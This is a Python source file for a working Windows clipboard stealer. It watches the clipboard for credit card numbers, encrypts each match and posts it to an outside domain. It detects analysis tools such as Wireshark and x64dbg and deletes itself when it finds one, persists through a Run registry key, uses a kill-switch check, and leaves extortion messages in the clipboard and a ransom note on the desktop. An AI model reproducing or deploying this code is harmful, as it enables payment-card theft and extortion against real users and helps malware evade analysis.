import win32clipboard
import re
import requests
from cryptography.fernet import Fernet
import time
import os
import sys
import winreg as reg

#Create regex pattern for card numbers
card_pattern = r"(?:[0-9]{4}-){3}[0-9]{4}|[0-9]{16}"

#Change our user agent from the default python-requests/2.23.0
headers = {
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36'
}

#define the symmertic encryption key
key = "HgtkASWwp27aRZmJeLz7zDdt19keMP0Rm3hGeeNatHQ="

#File paths for programs we want to exit on if found - anti analysis check - add in additional analysis related programs
AnalysisApplications = ["C:\Program Files\Wireshark\FAKE-APPLICATION", "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\FLARE", "C:\Program Files\Process Hacker 2", "C:\Program Files\x64dbg" ]

def exit_function():
    exit()

def self_delete():
    print("Goodbye")
    os.remove(sys.argv[0])
   
def add_to_startup(): #persistence via startup
    try: 
        #below get the path and the file name to complete a full path to the python script
        file_path = os.path.dirname(os.path.realpath(__file__))
        file_name = sys.argv[0]
        complete_address = os.path.join(file_path, file_name)
        #Access and create a mew entry in the registry
        key = reg.HKEY_CURRENT_USER
        key_value = "Software\Microsoft\Windows\CurrentVersion\Run"
        open = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
        reg.SetValueEx(open, "definitely not persistence", 0, reg.REG_SZ, complete_address)
        reg.CloseKey(open)
    except:
        exit_function()

def is_app_installed():
    for application in AnalysisApplications:
        if os.path.exists(application) == True:
           print("Analysis application installation found, goodbye")
           self_delete() 
        else:
            a="1"

def clipboard_stealer():
#get clipboard data
    win32clipboard.OpenClipboard()
    clipboard_data = win32clipboard.GetClipboardData()
    win32clipboard.CloseClipboard()

#Typecast clipboard data to string
    card_number = str(clipboard_data)

    # if what we have in our clipboard is indeed a card number then we want to steal it
    if re.match(card_pattern, card_number):
        print("Looks like that's a card number, let me just steal that :)")

        #Exfil the card number by encrypting it and sending it as a POST request
        fernet = Fernet(key)
        encryptedCardNumber = fernet.encrypt(card_number.encode())
        # Send a post request containing both, the encrypted card number and also the key used for encryption and decryption

        try:
            card_number_exfil = requests.post("https://manrajbansal.com", data={'cardnumber': encryptedCardNumber, 'EncryptionKey': key}, headers=headers)
        except:
            print("Attacker domain is not alive. Post failed, no credit card details sent. Exit")
            exit_function()

        #Access the clipboard and leave a message.
        win32clipboard.OpenClipboard()
        win32clipboard.EmptyClipboard()
        win32clipboard.SetClipboardText('Youve been PWNED, send bitcoin or we spend your money. Check your desktop for PWNED.txt')
        win32clipboard.CloseClipboard()

        clipboard_stealer.has_been_called = True
    else:
        #if the clipboard contents do not match a card number sleep for one minute and then run the function again
        time.sleep(60)
        clipboard_stealer()

clipboard_stealer.has_been_called = False

#kill switch mechanism to check if attacker domain is alive
try:
    kill_switch = requests.get('https://manrajbansal.com')
except:
    print("The kill switch domain is not alive, exit")
    exit_function()
    self_delete()

if kill_switch.status_code == 200:
    is_app_installed()
    add_to_startup()
    clipboard_stealer()
else:
    exit_function()

#write the ransome note to desktop
if clipboard_stealer.has_been_called == True:
    with open('C:\\Users\\Manraj\\Desktop\\PWNED.txt', 'w') as ransome_note:
        ransome_note.write('You have been hacked, send bitcoin to our address or we leak your credit card details')
else:
    exit_function()